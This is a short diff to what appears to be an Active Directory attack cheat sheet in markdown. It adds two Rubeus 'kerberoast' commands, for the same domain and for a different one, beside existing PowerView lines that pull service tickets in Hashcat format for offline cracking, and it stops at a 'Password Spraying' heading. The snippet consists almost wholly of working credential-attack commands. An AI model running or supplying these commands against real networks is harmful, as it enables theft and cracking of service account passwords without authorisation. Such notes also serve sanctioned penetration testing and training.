@@ -180,7 +180,13 @@ Import-Module .\PowerView.ps1
 Get-DomainUser * -SPN |Select samaccountname
 Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
 ```
+```
+.\rubeus.exe kerberoast /outfile:<fileName> #domain is the same 
+```
 
+```
+.\rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> #domain is different
+```
 **Password Spraying**
 
 ```
